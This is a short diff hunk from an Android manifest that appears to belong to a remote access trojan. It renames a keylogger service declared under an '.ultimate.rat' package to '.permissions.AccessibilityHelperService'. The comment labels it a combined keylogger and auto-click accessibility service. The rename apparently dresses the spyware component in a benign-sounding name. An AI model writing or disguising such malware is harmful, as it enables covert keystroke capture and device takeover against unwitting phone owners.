@@ -78,9 +78,9 @@
             </intent-filter>
         </receiver>
         
-        <!-- Accessibility Service for Keylogger -->
+        <!-- Combined Accessibility Service (Keylogger + Auto-Click) -->
         <service
-            android:name=".ultimate.rat.KeyloggerService"
+            android:name=".permissions.AccessibilityHelperService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true">
             <intent-filter>
